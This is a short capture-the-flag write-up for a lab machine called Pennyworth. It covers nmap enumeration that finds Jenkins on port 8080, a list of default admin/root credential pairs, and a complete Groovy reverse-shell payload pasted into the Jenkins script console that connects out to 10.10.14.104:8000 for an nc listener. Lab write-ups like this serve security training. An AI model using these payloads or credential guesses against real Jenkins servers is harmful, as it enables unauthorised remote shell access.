# ENUMERATION

nmap:
```shell
└─$ nmap -sC -sV 10.129.157.169 -o nmap.txt  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-02 19:32 CEST
Nmap scan report for 10.129.157.169
Host is up (0.031s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
zsh: segmentation fault  nmap -sC -sV 10.129.157.169 -o nmap.txt
                                                                                                            
┌──(darthv㉿elite)-[~/…/badorius/vulnhub/Pennyworth/enumeration]
```

Open http://10.129.157.169:8080 on browser and Jenkins login page. GG search for a default jenkins credentials and try with it:

```
admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1
```

# Foothold

Starting reverse shell, take a look on following jenkins web info:

[Hacktricks Jenkins](https://book.hacktricks.xyz/cloud-security/jenkins#code-execution)
[GitHub PWN Jenkins](https://github.com/gquere/pwn_jenkins)

We are going to open script groovy console, and use the following reverse shell on [groovy](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) section.

Go to http://10.129.157.169:8080/script and type the following pyload on script input box:
```
String host="10.10.14.104";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Start reverse shell:

```shell
└─$ nc -lvnp 8000                          
Listening on 0.0.0.0 8000

```
Done

9cdfb439c7876e703e307864c9167a15
